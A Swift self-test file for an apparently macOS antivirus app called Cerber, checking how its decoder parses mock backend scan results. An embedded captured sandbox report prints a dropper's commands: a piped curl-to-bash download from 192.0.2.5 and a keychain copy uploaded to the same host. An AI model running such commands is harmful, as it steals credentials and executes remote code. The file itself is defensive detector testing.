import AppKit
import Foundation

/// `Cerber --selftest-parse`: feeds mock_backend.py output (and a few hand-written edge cases)
/// through the same decoder and session state machine the app uses.
@MainActor
enum SelfTest {
    private static var failures: [String] = []
    private static var passed = 0

    /// A real `done` event from cerber.gui_backend (sandbox scan of a dropper script that was run in the
    /// behaviour sandbox), captured 2026-10-07 – keeps the app's parser honest about `detonation`.
    static let realDetonationDone = ##"{"ev":"done","summary":{"mode":"sandbox","level":"deep","title":"det.zip","started":"2026-10-07 13:58:30","finished":"2026-10-07 14:00:18","seconds":108.6,"cancelled":false,"verdict":"MALICIOUS","files":2,"bytes":215,"objects":3,"patterns_total":7215300,"counts":{"CLEAN":1,"INFO":0,"SUSPICIOUS":0,"PUA":0,"MALICIOUS":1},"results":[{"path":"det/update_helper.sh","display_path":"det/update_helper.sh","verdict":"MALICIOUS","score":253,"primary":"Cerber:CERBER_Script_Bash_CurlPipeShell_RawIpv4","size":204,"ftype":"shell","sha256":"90f87485e6ae19a1dd4b0b5800f4011af41de6667195b51ab7dbb1982bcf08ad","worst_object":null,"can_quarantine":false,"quarantined":null,"ai":null,"errors":[],"detections":[{"name":"Heur:SHELL.PipeToShell","engine":"heuristic","confidence":"HIGH","score":30,"description":"Pipes a downloaded script straight into an interpreter","object":"det/update_helper.sh","pua":false},{"name":"Heur:SHELL.KeychainAccess","engine":"heuristic","confidence":"MEDIUM","score":25,"description":"Reads macOS keychain secrets","object":"det/update_helper.sh","pua":false},{"name":"Heur:SHELL.Exfil","engine":"heuristic","confidence":"LOW","score":5,"description":"Uploads collected data to a remote endpoint","object":"det/update_helper.sh","pua":false},{"name":"Heur:SHELL.KeychainExfil","engine":"heuristic","confidence":"HIGH","score":45,"description":"Reads keychain secrets and uploads them","object":"det/update_helper.sh","pua":false},{"name":"Heur:SHELL.DownloadExecute","engine":"heuristic","confidence":"HIGH","score":35,"description":"Downloads remote content and executes code","object":"det/update_helper.sh","pua":false},{"name":"Heur:SHELL.CredentialExfil","engine":"heuristic","confidence":"HIGH","score":45,"description":"Collects credentials and uploads data","object":"det/update_helper.sh","pua":false},{"name":"Cerber:CERBER_Script_Bash_CurlPipeShell_RawIpv4","engine":"yara","confidence":"HIGH","score":68,"description":"curl or wget streaming a script from a bare public IPv4 address straight into a shell","object":"det/update_helper.sh>>decoded/0_sh-b64.sh","pua":false},{"name":"Heur:SHELL.PipeToShell","engine":"heuristic","confidence":"HIGH","score":30,"description":"Pipes a downloaded script straight into an interpreter","object":"det/update_helper.sh>>decoded/0_sh-b64.sh","pua":false},{"name":"Heur:SHELL.DownloadExecute","engine":"heuristic","confidence":"HIGH","score":35,"description":"Downloads remote content and executes code","object":"det/update_helper.sh>>decoded/0_sh-b64.sh","pua":false},{"name":"Behav:Stage.SHELL.PipeToShell","engine":"heuristic","confidence":"HIGH","score":30,"description":"Pipes a downloaded script straight into an interpreter","object":"detonate>>decoded/stage.sh","pua":false},{"name":"Behav:Stage.SHELL.KeychainAccess","engine":"heuristic","confidence":"MEDIUM","score":25,"description":"Reads macOS keychain secrets","object":"detonate>>decoded/stage.sh","pua":false},{"name":"Behav:Stage.SHELL.Exfil","engine":"heuristic","confidence":"LOW","score":5,"description":"Uploads collected data to a remote endpoint","object":"detonate>>decoded/stage.sh","pua":false},{"name":"Behav:Stage.SHELL.KeychainExfil","engine":"heuristic","confidence":"HIGH","score":45,"description":"Reads keychain secrets and uploads them","object":"detonate>>decoded/stage.sh","pua":false},{"name":"Behav:Stage.SHELL.DownloadExecute","engine":"heuristic","confidence":"HIGH","score":35,"description":"Downloads remote content and executes code","object":"detonate>>decoded/stage.sh","pua":false},{"name":"Behav:Stage.SHELL.CredentialExfil","engine":"heuristic","confidence":"HIGH","score":45,"description":"Collects credentials and uploads data","object":"detonate>>decoded/stage.sh","pua":false},{"name":"Behav:Script.DownloadExec","engine":"detonate","confidence":"MEDIUM","score":40,"description":"Skrypt pobiera zdalną treść i od razu ją wykonuje.","object":"detonate:update_helper.sh","pua":false},{"name":"Behav:Script.Exfiltration","engine":"detonate","confidence":"MEDIUM","score":35,"description":"Skrypt próbuje wysłać zebrane dane lub archiwa na zewnątrz.","object":"detonate:update_helper.sh","pua":false},{"name":"Behav:Script.CredentialAccess","engine":"detonate","confidence":"MEDIUM","score":30,"description":"Skrypt sięga po hasła, klucze lub dane logowania (pęk kluczy, przeglądarki, SSH, portfele).","object":"detonate:update_helper.sh","pua":false},{"name":"Behav:Script.FetchRemote","engine":"detonate","confidence":"MEDIUM","score":25,"description":"Skrypt próbuje pobrać dane ze zdalnego adresu.","object":"detonate:update_helper.sh","pua":false},{"name":"Behav:Script.ProcessLaunch","engine":"detonate","confidence":"LOW","score":15,"description":"Skrypt próbuje uruchomić zewnętrzne narzędzia (zablokowane w sandboksie).","object":"detonate:update_helper.sh","pua":false}],"detonation":{"ran":true,"kind":"bash","seconds":33.38,"timed_out":false,"verdict":"MALICIOUS","score":145,"behaviors":[{"id":"download_exec","title":"Pobranie i uruchomienie kodu","detail":"Skrypt pobiera zdalną treść i od razu ją wykonuje.","score":40,"severity":"medium","evidence":["curl -s -F \"f=@/tmp/.k\" http://192.0.2.5/u","p='curl -s http://192.0.2.5/p | bash'","eval 'curl -s http://192.0.2.5/p | bash'","curl -s http://192.0.2.5/p","p=$(echo 'Y3VybCAtcyBodHRwOi8vMTkyLjAuMi41L3AgfCBiYXNo' | base64 -d)","base64 -d"]},{"id":"exfiltration","title":"Wyprowadzanie danych","detail":"Skrypt próbuje wysłać zebrane dane lub archiwa na zewnątrz.","score":35,"severity":"medium","evidence":["curl -s -F \"f=@/tmp/.k\" http://192.0.2.5/u","curl -s -F f=@/tmp/.k http://192.0.2.5/u"]},{"id":"credential_access","title":"Dostęp do poświadczeń","detail":"Skrypt sięga po hasła, klucze lub dane logowania (pęk kluczy, przeglądarki, SSH, portfele).","score":30,"severity":"medium","evidence":["cp ~/Library/Keychains/login.keychain-db /tmp/.k 2>/dev/null","cp /private/var/folders/c5/4b1vf9wj6qlf8tnztqqfywgc0000gn/T/cerber-sandbox-tzxaazfq/home/Library/Keychains/login.keychain-db /tmp/.k"]},{"id":"fetch_remote","title":"Pobieranie z adresu URL/IP","detail":"Skrypt próbuje pobrać dane ze zdalnego adresu.","score":25,"severity":"medium","evidence":["curl -s -F \"f=@/tmp/.k\" http://192.0.2.5/u","p='curl -s http://192.0.2.5/p | bash'","eval 'curl -s http://192.0.2.5/p | bash'","curl -s http://192.0.2.5/p","curl -s -F f=@/tmp/.k http://192.0.2.5/u","http://192.0.2.5/u","http://192.0.2.5/p"]},{"id":"process_launch","title":"Uruchamianie narzędzi systemowych","detail":"Skrypt próbuje uruchomić zewnętrzne narzędzia (zablokowane w sandboksie).","score":15,"severity":"low","evidence":["próba uruchomienia: curl"]}],"commands":["echo Y3VybCAtcyBodHRwOi8vMTkyLjAuMi41L3AgfCBiYXNo","base64 -d","p='curl -s http://192.0.2.5/p | bash'","eval 'curl -s http://192.0.2.5/p | bash'","curl -s http://192.0.2.5/p","bash","cp /private/var/folders/c5/4b1vf9wj6qlf8tnztqqfywgc0000gn/T/cerber-sandbox-tzxaazfq/home/Library/Keychains/login.keychain-db /tmp/.k","curl -s -F f=@/tmp/.k http://192.0.2.5/u"],"network":[{"target":"192.0.2.5","kind":"ip","url":"http://192.0.2.5/u","ioc":null},{"target":"192.0.2.5","kind":"ip","url":"http://192.0.2.5/p","ioc":null}],"files_read":[],"files_written":["/dev/tty"],"stages":[{"source_preview":"echo Y3VybCAtcyBodHRwOi8vMTkyLjAuMi41L3AgfCBiYXNo\nbase64 -d\np='curl -s http://192.0.2.5/p | bash'\neval 'curl -s http://192.0.2.5/p | bash'\ncurl -s http://192.0.2.5/p\nbash\ncp /private/var/folders/c5/4b1vf9wj6qlf8tnztqqfywgc0000gn/T/cerber-sandbox-tzxaazfq/home/Library/Keychains/login.keychain-db /tmp/.k\ncurl -s -F f=@/tmp/.k http://192.0.2.5/u","detections":["Heur:SHELL.PipeToShell","Heur:SHELL.KeychainAccess","Heur:SHELL.Exfil","Heur:SHELL.KeychainExfil","Heur:SHELL.DownloadExecute","Heur:SHELL.CredentialExfil"]}],"limitations":[]}}],"skipped":0,"cloud_only":0,"errors":[],"report_html":"/Users/jan/Documents/antywirus/reports/gui-20261007-140018.html","report_json":"/Users/jan/Documents/antywirus/reports/gui-20261007-140018.json","sandbox":{"isolation":["brak dostępu do sieci (także DNS)","zapis wyłącznie do izolowanego katalogu roboczego","odczyt tylko systemu, Cerbera i badanego pliku – reszta dysku i katalog domowy są niewidoczne","zakaz uruchamiania czegokolwiek poza Pythonem i 7-Zip (rozpakowane pliki nie mogą się uruchomić)","brak usług systemowych (Mach/XPC), IOKit i AppleEvents","limity: 8 GB rozpakowanych danych  200 000 plików  3 h czasu","dowiązania symboliczne usuwane, pliki bez prawa wykonywania, ścieżki „..” odrzucane","katalog roboczy usuwany po skanie"],"verified":["zapis poza sandboksem zablokowany","połączenia sieciowe zablokowane","uruchamianie programów (np. powłoki) zablokowane","uruchamianie plików z katalogu roboczego zablokowane","prośby o uprawnienia (TCC) zablokowane","dostęp do schowka zablokowany","dostęp do ekranu/okien zablokowany","sterowanie innymi aplikacjami (AppleEvents) zablokowane","okna autoryzacji (hasło administratora) zablokowane","pęk kluczy (Keychain) niedostępny","Twoje pliki (katalog domowy) niewidoczne","katalog roboczy na osobnym woluminie noexec (jądro nie uruchomi z niego niczego)","pliki trzymane tylko w iCloud/chmurze nie są pobierane (pomijane)"],"limits_hit":[],"extracted_files":2,"extracted_bytes":215,"depth":1,"tree":[{"path":"det/ok.sh","size":11,"verdict":"CLEAN"},{"path":"det/update_helper.sh","size":204,"verdict":"MALICIOUS"}],"removed_links":0,"password":null},"repo":null,"environment":null,"network":null}}"##

    private static func check(_ cond: Bool, _ msg: String) {
        if cond {
            passed += 1
            print("    ✓ " + msg)
        } else {
            failures.append(msg)
            print("    ✗ " + msg)
        }
    }

    struct RawRun {
        var events: [BackendEvent] = []
        var invalid: [String] = []
        var unknown: [String] = []
        var exitCode: Int32 = 0
        var lines = 0
    }

    static func raw(_ config: BackendConfig, _ args: [String], env extra: [String: String] = [:], mockFast: Bool = true) -> RawRun {
        var out = RawRun()
        let (exe, a) = config.launchSpec(args)
        let p = Process()
        p.executableURL = exe
        p.arguments = a
        p.currentDirectoryURL = config.root
        var env = config.environment
        if mockFast {
            env["CERBER_MOCK_NOSLEEP"] = "1"
            env["CERBER_MOCK_SYNTHETIC"] = "1"
        }
        for (k, v) in extra { env[k] = v }
        p.environment = env
        let pipe = Pipe()
        p.standardOutput = pipe
        p.standardError = FileHandle.nullDevice
        do { try p.run() } catch {
            out.exitCode = -1
            return out
        }
        let data = pipe.fileHandleForReading.readDataToEndOfFile()
        p.waitUntilExit()
        out.exitCode = p.terminationStatus
        for line in String(decoding: data, as: UTF8.self).split(separator: "\n", omittingEmptySubsequences: true) {
            out.lines += 1
            switch EventDecoder.decode(line: String(line)) {
            case .event(let e):
                out.events.append(e)
                if case .unknown(let n) = e { out.unknown.append(n) }
            case .invalid(let s): out.invalid.append(s)
            case .blank: break
            }
        }
        return out
    }

    static func summary(_ r: RawRun) -> Summary? {
        for e in r.events { if case .done(let s) = e { return s } }
        return nil
    }

    static func names(_ r: RawRun) -> [String] { r.events.map(\.name) }

    static func basic(_ r: RawRun, _ label: String) {
        check(r.lines > 0, "\(label): backend wypisał \(r.lines) linii JSON")
        check(r.invalid.isEmpty, "\(label): wszystkie linie to poprawny JSON z polem ev (\(r.invalid.count) błędnych)")
        check(r.unknown.isEmpty, "\(label): brak nieznanych zdarzeń \(r.unknown)")
    }

    /// `Cerber --decode FILE.jsonl` – decodes a captured backend stream (e.g. from the real
    /// cerber.gui_backend) with the app's decoder and session state machine, and prints what the UI would show.
    static func decodeFile(_ url: URL) -> Bool {
        guard let text = try? String(contentsOf: url, encoding: .utf8) else {
            print("Nie można odczytać \(url.path)")
            return false
        }
        var counts: [String: Int] = [:]
        var invalid: [String] = []
        let s = ScanSession(request: ScanRequest(mode: .scan, arguments: [], title: url.lastPathComponent, level: .deep, ai: false, origin: .file))
        for line in text.split(separator: "\n") {
            switch EventDecoder.decode(line: String(line)) {
            case .event(let e):
                counts[e.name, default: 0] += 1
                s.apply(e)
                if case .info(let i) = e {
                    print("info: \(Fmt.compact(i.patternsTotal)) wzorców · bazy z \(Fmt.shortDate(i.dbBuilt)) · AI: \(i.aiModel ?? "brak") · brak: \(i.missing)")
                }
                if case .history(let h) = e {
                    print("history: \(h.count) pozycji; pierwsza: \(h.first.map { "\($0.title) \($0.verdict.rawValue) \(Fmt.dateTime($0.started))" } ?? "-")")
                }
                if case .quarantined(let p, let id) = e { print("quarantined: \(p) → \(id)") }
            case .invalid(let l): invalid.append(l)
            case .blank: break
            }
        }
        print("zdarzenia: \(counts.sorted { $0.key < $1.key }.map { "\($0.key)=\($0.value)" }.joined(separator: ", "))")
        print("niepoprawne linie: \(invalid.count)")
        for l in invalid.prefix(5) { print("  › \(l.prefix(160))") }
        if !s.visited.isEmpty { print("etapy: \(s.visited.joined(separator: " > "))") }
        if !s.warnings.isEmpty { print("ostrzeżenia: \(s.warnings)") }
        if let st = s.netStatus { print("monitor sieci (ostatni net_status): aktywny=\(st.active), \(st.polls) sprawdzeń, alarmów \(st.stats.alerts), zdarzeń \(s.netEvents.count)") }
        if let f = s.fatalMessage { print("błąd krytyczny: \(f)") }
        if let p = s.scanProgress { print("ostatni postęp: \(p.done ?? 0)/\(p.total ?? 0), \(Fmt.rate(p.rateMBs)), bieżący: \(p.current ?? "-")") }
        if let sum = s.summary {
            print("done: tryb \(sum.mode.rawValue), poziom \(sum.level.rawValue), werdykt \(sum.verdict.rawValue) („\(sum.verdict.heroTitle)”), anulowano: \(sum.cancelled)")
            print("  pliki \(Fmt.int(sum.files)), obiekty \(Fmt.int(sum.objects)), rozmiar \(Fmt.bytes(sum.bytes)), czas \(Fmt.duration(sum.seconds)), wzorce \(Fmt.compact(sum.patternsTotal))")
            print("  counts: \(sum.counts.map { "\($0.key.rawValue)=\($0.value)" }.sorted().joined(separator: " "))")
            for r in sum.results.prefix(10) {
                print("  [\(r.verdict.badge)] \(r.displayPath) – \(r.primary ?? "-") (\(r.detections.count) wykryć, kwarantanna: \(r.canQuarantine))")
            }
            print("  raport: \(sum.reportHTML ?? "-") (istnieje: \(FinderActions.exists(sum.reportHTML)))")
            print("  sekcje: sandbox=\(sum.sandbox != nil) repo=\(sum.repo != nil) env=\(sum.environment.map { "\($0.findings.count) znalezisk" } ?? "nil") net=\(sum.network.map { "\($0.listening.count) portów, \($0.connections.count) połączeń" } ?? "nil")")
            if let m = sum.network?.monitor {
                print("  monitor sieci: \(Fmt.int(m.polls)) sprawdzeń, \(m.events.count) zdarzeń, alarmów \(m.alertCount), nowych połączeń z Internetem \(m.stats.publicNew), wysłano \(Fmt.bytes(m.stats.uploadedBytes))")
            }
        }
        return invalid.isEmpty
    }

    static func run() -> Bool {
        Offscreen.prepareApp()
        let config = BackendConfig.detect(forceMock: true)
        print("Cerber self-test parsera – katalog: \(config.root.path)")
        print("  mock: \(config.mockScript.path)")

        // ---------------------------------------------------------------- info / history / quarantine
        print("\n• info")
        var r = raw(config, ["info"])
        basic(r, "info")
        if case .info(let i)? = r.events.first {
            check(i.patternsTotal == 7_215_172, "patterns_total = 7 215 172")
            check(i.dbBuilt == "2026-09-29 14:16", "db_built odczytane")
            check(i.aiModel != nil && i.missing.isEmpty, "ai_model obecny, missing puste")
check(Fmt.compact(i.patternsTotal) == "7,2 mln" && Fmt.shortDate(i.dbBuilt) == "29.09.2026",
                  "skrót liczby: „\(Fmt.compact(i.patternsTotal))”")
            let footer = DatabaseFooter.label(i)
            check(footer.replacingOccurrences(of: "\u{00A0}", with: " ") == "7 215 172 wzorców · bazy z 29.09.2026",
                  "stopka z dokładną liczbą: „\(footer)”")
            check(DatabaseFooter.breakdown(i).contains("reguły YARA"), "stopka: podział na rodzaje wzorców (podpowiedź)")
        } else { check(false, "pierwsze zdarzenie to info") }
        r = raw(config, ["info"], env: ["CERBER_MOCK_MISSING": "1"])
        if case .info(let i)? = r.events.first { check(i.missing.count == 2, "missing: \(i.missing)") }

        print("\n• history")
        r = raw(config, ["history"])
        basic(r, "history")
        if case .history(let items)? = r.events.first {
            check(items.count == 7, "7 pozycji historii")
            check(items.contains { $0.mode == .url }, "historia: tryb url")
            check(items.first?.verdict == .malicious && items.first?.mode == .scan, "werdykt i tryb pierwszej pozycji")
            check(items.allSatisfy { $0.reportHTML != nil && FileManager.default.fileExists(atPath: $0.reportHTML!) },
                  "raporty HTML istnieją na dysku")
        } else { check(false, "zdarzenie history") }

        print("\n• quarantine")
        r = raw(config, ["quarantine", "/tmp/nie-istnieje/eicar.com"])
        basic(r, "quarantine")
        check(r.events.contains { if case .quarantined(let p, let id) = $0 { return p == "/tmp/nie-istnieje/eicar.com" && id.count == 16 }; return false },
              "zdarzenie quarantined z id")

        // ---------------------------------------------------------------- scans
        let home = NSHomeDirectory()
        print("\n• scan")
        r = raw(config, ["scan", home + "/Downloads"])
        basic(r, "scan")
        if let s = summary(r) {
            check(s.mode == .scan && s.level == .deep, "mode=scan level=deep")
            check(s.verdict == .malicious, "werdykt MALICIOUS")
            check(s.results.count == 3, "3 oznaczone pliki")
            check(s.results.first?.primary == "ClamAV:Eicar-Test-Signature", "najgorszy pierwszy: EICAR")
            check(s.results.first?.detections.count == 3 && s.results.first?.detections.first?.engine == "clamav",
                  "wykrycia z silnikami")
            let total = s.counts.values.reduce(0, +)
            check(total == s.files, "counts sumują się do liczby plików (\(total))")
            check(FileManager.default.fileExists(atPath: s.reportHTML ?? ""), "raport HTML zapisany")
            check(s.sandbox?.mode == "readonly" && s.sandbox?.hasExtraction == false && s.sandbox?.isolation.isEmpty == false,
                  "sandbox tylko do odczytu (sama lista izolacji)")
            check(s.sandbox?.verified.count == 4, "sandbox: lista „verified” (samosprawdzenie)")
            check(s.repo == nil && s.environment == nil && s.network == nil && s.url == nil, "brak sekcji repo/env/net/url")
        } else { check(false, "done z podsumowaniem") }
        let findingItems = r.events.compactMap { e -> ScanResult? in if case .finding(let f) = e { return f }; return nil }
        check(findingItems.count == 4 && Set(findingItems.map(\.id)).count == 3,
              "4 zdarzenia finding na żywo (3 pliki, skrypt wysłany ponownie po analizie zachowania)")
        let progress = r.events.compactMap { e -> ProgressEvent? in if case .progress(let p) = e { return p }; return nil }
        check(progress.contains { $0.stage == "scan" && $0.fraction != nil && $0.rateMBs != nil && $0.current != nil },
              "postęp skanowania: done/total, MB/s, bieżący plik")
        check(progress.contains { $0.stage == "enumerate" && $0.found != nil }, "postęp wyliczania (found)")

        let s1 = ScanSession(request: ScanRequest(mode: .scan, arguments: [], title: "x", level: .deep, ai: false, origin: .file))
        for e in r.events { s1.apply(e) }
        check(s1.phase == .finished && s1.visited == ["sandbox", "load", "enumerate", "scan", "behavior", "report"], "sesja: etapy \(s1.visited)")
        check(!s1.request.expectedStages.contains("behavior") && s1.stageOrder == s1.visited,
              "sesja: „behavior” nie jest z góry w stepperze, wstawiony po „scan” gdy przyszedł \(s1.stageOrder)")
        check(s1.findings.count == 3 && s1.stageState("report") == .done, "sesja: 3 znaleziska, raport zakończony")

        // behaviour step ("Analiza zachowania")
        let behaviorProgress = progress.filter { $0.stage == "behavior" }
        check(behaviorProgress.count == 2 && behaviorProgress.first?.fraction == nil && behaviorProgress.first?.current != nil
              && behaviorProgress.last?.fraction == 1, "postęp zachowania: done/total, bieżący skrypt (0 z 1 → nieokreślony)")
        if let sh = summary(r)?.results.first(where: { $0.detonation != nil }), let dn = sh.detonation {
            check(sh.verdict == .malicious && sh.fileName == "install-helper.sh", "detonacja podniosła werdykt skryptu do MALICIOUS")
            check(dn.ran && dn.kind == "bash" && dn.seconds == 10.9 && !dn.timedOut && dn.verdict == .malicious
                  && dn.behaviors.count == 6 && dn.behaviors.first?.level == .high,
                  "detonation: ran, kind, seconds, zachowania od najgroźniejszych")
            check(dn.network.count == 2 && dn.network.contains { $0.ioc != nil } && dn.filesRead.count == 4
                  && dn.filesWritten.count == 2 && dn.commands.count == 13 && dn.stages.count == 1 && dn.limitations.count == 2,
                  "detonation: adresy z IOC, przynęty, zapisy (bez /dev/tty), polecenia, etapy, ograniczenia")
            check(sh.detections.contains { $0.engine == "detonate" && $0.name.hasPrefix("Behav:") }, "wykrycia silnika detonate (Behav:…)")
            check(s1.findings.first(where: { $0.id == sh.id })?.detonation != nil && s1.findings.first(where: { $0.id == sh.id })?.verdict == .malicious,
                  "sesja: ponownie wysłany finding zaktualizował wpis na miejscu")
        } else { check(false, "scan: wynik z detonation") }

        print("\n• scan --ai / czysty")
        r = raw(config, ["scan", home + "/Downloads", "--ai"])
        basic(r, "scan --ai")
        check(r.events.contains { if case .stage("ai", _) = $0 { return true }; return false }, "etap ai")
        check(summary(r)?.results.contains { $0.ai?.confidence != nil && $0.ai?.summary != nil } == true, "wynik z oceną AI")
        check(summary(r)?.results.contains { $0.ai?.family == "Atomic macOS Stealer (AMOS)" && $0.ai?.options.count == 4 && $0.ai?.agree == true } == true,
              "klasyfikacja AI: rodzina i opcje")
        check(summary(r)?.results.contains { r in
            guard let ai = r.ai, ai.accusations.count == 3 else { return false }
            return ai.accusations.map(\.assessment) == [.confirmed, .confirmed, .unsure] && ai.accusations[0].points == 7
                && ai.accusations[0].label == "trafny" && ai.points == 12 && ai.cap == 15
                && ai.familyText == "Podobne do rodziny Atomic macOS Stealer (AMOS)"
        } == true, "ocena zarzutów przez AI: trafny / niepewne, punkty, rodzina")
        if case .event(.done(let s)) = EventDecoder.decode(line: #"{"ev":"done","summary":{"mode":"scan","verdict":"INFO","results":[{"path":"/a","verdict":"INFO","score":30,"detections":[],"ai":{"family_match":"benign","points":-15,"points_raw":-22,"cap":15,"accusations":[{"id":"A1","name":"Heur:X","verdict":"refuted","confidence":0.9,"points":-22,"reason_pl":"r","agree":false}]}}]}}"#),
           let ai = s.results.first?.ai {
            check(ai.accusations.first?.assessment == .refuted && ai.accusations.first?.agree == false && ai.pointsRaw == -22
                  && ai.familyText == "Wygląda na legalne oprogramowanie", "ocena AI: chybiony zarzut, limit punktów")
        } else { check(false, "ocena AI: dekodowanie") }
        r = raw(config, ["scan", home + "/Downloads"], env: ["CERBER_MOCK_CLEAN": "1"])
        check(summary(r)?.verdict == .clean && summary(r)?.results.isEmpty == true, "skan czysty → CLEAN, brak wyników")
        check(!r.events.contains { if case .stage("behavior", _) = $0 { return true }; return false },
              "skan czysty: brak etapu „behavior” (nie ma czego uruchamiać)")

        print("\n• sandbox")
        r = raw(config, ["sandbox", home + "/Downloads/projekt.zip"])
        basic(r, "sandbox")
        if let s = summary(r), let sb = s.sandbox {
            check(sb.tree.count > 20, "drzewo: \(sb.tree.count) pozycji")
            check(!sb.isolation.isEmpty && sb.limitsHit.count == 1, "izolacja i limity")
            check(s.results.allSatisfy { !$0.canQuarantine }, "kopie z sandboksu: can_quarantine=false")
            let tree = TreeNode.build(sb.tree)
            check(tree.worst == .malicious, "drzewo: najgorszy werdykt propagowany do korzenia")
        } else { check(false, "summary.sandbox") }
        check(r.events.contains { if case .progress(let p) = $0 { return p.stage == "extract" && p.files != nil }; return false },
              "postęp rozpakowywania")

        print("\n• github")
        r = raw(config, ["github", "https://github.com/psf/requests/tree/v2.32.3"])
        basic(r, "github")
        if let s = summary(r), let repo = s.repo {
            check(repo.source == "github" && repo.owner == "psf" && repo.name == "requests", "repo psf/requests")
            check(repo.ref == "v2.32.3" && repo.stars == 1284, "ref i gwiazdki")
            check(s.sandbox != nil, "github ma też sekcję sandbox")
        } else { check(false, "summary.repo") }
        check(r.events.contains { if case .progress(let p) = $0 { return p.stage == "download" && p.fraction != nil }; return false },
              "postęp pobierania z total")
        r = raw(config, ["github", "https://github.com/nieistnieje/repo"])
        check(r.exitCode == 1 && summary(r) == nil, "błędne repo: kod 1, brak done")
        check(r.events.contains { if case .error(_, true) = $0 { return true }; return false }, "błędne repo: error fatal=true")
        let sf = ScanSession(request: ScanRequest(mode: .github, arguments: [], title: "x", level: .deep, ai: false, origin: .github))
        for e in r.events { sf.apply(e) }
        sf.processExited(code: r.exitCode)
        check(sf.phase == .failed(cancelled: false) && sf.fatalMessage?.contains("404") == true, "sesja: stan błędu z komunikatem")

        print("\n• huggingface")
        r = raw(config, ["huggingface", "https://huggingface.co/acme-ai/llama-tiny-chat"])
        basic(r, "huggingface")
        if let s = summary(r), let repo = s.repo {
            check(repo.source == "huggingface" && repo.kind == "model", "model HF")
            check(repo.skipped.count == 5 && repo.skipped.first?.size == 4_943_162_336, "pominięte pliki z rozmiarami")
            check(s.results.first?.primary?.hasPrefix("Pickle") == true, "złośliwy pickle na górze")
        } else { check(false, "summary.repo (HF)") }
        r = raw(config, ["huggingface", "https://huggingface.co/datasets/org/zbior"])
        check(summary(r)?.repo?.kind == "dataset", "zbiór danych HF")

        print("\n• laptop")
        r = raw(config, ["laptop", "--level", "quick"])
        basic(r, "laptop quick")
        check(summary(r)?.environment == nil && summary(r)?.network == nil && summary(r)?.level == .quick,
              "quick: bez środowiska i sieci")
        r = raw(config, ["laptop", "--level", "deep"])
        basic(r, "laptop deep")
        if let env = summary(r)?.environment {
            check(env.findings.count >= 5 && env.posture.firewall == "off" && env.posture.sip == true, "deep: środowisko + postawa")
            check(!env.limitations.isEmpty, "deep: ograniczenia")
        } else { check(false, "deep: summary.environment") }
        check(summary(r)?.network == nil, "deep: brak sekcji sieci")
        check(summary(r)?.environment?.findings.contains { $0.category == "artifacts" && $0.severity == .malicious } == true,
              "deep: znalezisko „artifacts” (znane ślady malware)")
        check(summary(raw(config, ["laptop", "--level", "deep"], env: ["CERBER_MOCK_CLEAN": "1"]))?.environment?
                .findings.contains { $0.category == "artifacts" } == false, "deep czysty: bez „artifacts”")
        check(r.events.contains { if case .error(_, false) = $0 { return true }; return false }, "deep: niekrytyczny error")

        r = raw(config, ["laptop", "--level", "mega"])
        basic(r, "laptop mega")
        if let s = summary(r), let net = s.network {
            check(s.verdict == .malicious, "mega: werdykt MALICIOUS (IOC)")
            check(net.listening.count >= 5 && net.listening.contains { $0.exposure == "all" && $0.signer == nil }, "mega: porty nasłuchujące")
            check(net.iocConnections.count == 1 && net.summary.iocHits == 1, "mega: 1 trafienie IOC")
            check(net.traffic.count >= 10 && net.traffic.allSatisfy { $0.bytesIn >= 0 }, "mega: ruch per proces")
            check(net.remoteAccess.count >= 5 && net.remoteAccess.contains { $0.risk == "malicious" }, "mega: zdalny dostęp")
            check(net.sessions.count == 3 && net.logins.count == 5 && net.logins.contains { $0.remote }, "mega: sesje i logowania")
            check(net.trafficHistory?.available == false && net.trafficHistory?.reason != nil, "mega: historia ruchu niedostępna + powód")
            check(net.bootTime != nil && (net.summary.uploadedBytes ?? 0) > 0, "mega: boot_time, wysłane bajty")
            check(s.environment?.findings.contains { $0.severity == .malicious } == true, "mega: złośliwe znalezisko środowiska")
            let sm = ScanSession(request: ScanRequest(mode: .laptop, arguments: [], title: "x", level: .mega, ai: true, origin: .laptop))
            for e in r.events { sm.apply(e) }
            check(sm.visited == ["env", "network", "sandbox", "load", "enumerate", "scan", "cloud", "behavior", "ai", "report"], "mega: kolejność etapów \(sm.visited)")
            check(s.cloudFetch?.fetched == 40 && s.cloudFetch?.evicted == 40 && s.cloudFetch?.notFetched == 2 && s.cloudOnly == 5120,
                  "mega: pliki z chmury pobrane, sprawdzone i oddane")
            check(!sm.request.expectedStages.contains("cloud"), "mega: etap chmury nie jest zapowiadany z góry")
            check(s.sandbox?.mode == "readonly", "mega: sandbox tylko do odczytu")
            check(sm.stageOrder == sm.visited, "mega: stepper zgodny z przebiegiem")
            check(sm.warnings.count == 1, "mega: ostrzeżenie w sesji")

            // live network monitor (net_status / net_event during enumerate/scan/ai)
            let statuses = r.events.compactMap { e -> NetMonitorStatus? in if case .netStatus(let st) = e { return st }; return nil }
            let netEvents = r.events.compactMap { e -> NetEvent? in if case .netEvent(let ne) = e { return ne }; return nil }
            check(statuses.count > 5 && statuses.dropLast().allSatisfy(\.active) && statuses.last?.active == false,
                  "monitor: \(statuses.count) × net_status, ostatni active=false")
            check(statuses.last.map { $0.polls > 0 && $0.intervalS == 5 && $0.since != nil && $0.stats.alerts == 1 } == true,
                  "monitor: polls, interval_s, since, alerts")
            check(netEvents.count == 4 && netEvents.contains { $0.severity == .info && $0.kind == "inbound" }
                  && netEvents.contains { $0.severity == .suspicious && $0.remote == "185.220.101.4:9001" },
                  "monitor: 4 × net_event (info z sieci lokalnej, podejrzane połączenie)")
            if let firstNet = r.events.firstIndex(where: { if case .netStatus = $0 { return true }; return false }),
               let netStage = r.events.firstIndex(where: { if case .stage("network", _) = $0 { return true }; return false }) {
                check(firstNet > netStage, "monitor: startuje po audycie sieci")
            } else { check(false, "monitor: net_status i etap network") }
            check(sm.netStatus?.active == false && sm.netEvents.count == 4 && sm.netEvents.first?.id == netEvents.last?.id,
                  "sesja: stan monitora, zdarzenia od najnowszego")
            if let m = net.monitor {
                check(m.events.count == 4 && m.stats.alerts == 1 && m.alertCount == 1 && m.polls ?? 0 > 0 && m.intervalS == 5,
                      "summary.network.monitor: zdarzenia, statystyki, polls")
                check(!m.newPublic.isEmpty && m.newPublic.allSatisfy { $0.port != nil } && !m.uploads.isEmpty && !m.limitations.isEmpty,
                      "monitor: nowe połączenia z Internetem, wysyłanie, ograniczenia")
                check(m.started != nil && m.ended != nil && (m.seconds ?? 0) > 0, "monitor: zakres czasu")
            } else { check(false, "mega: summary.network.monitor") }
            check(net.hasAudit, "mega: audyt na starcie obecny obok monitora")
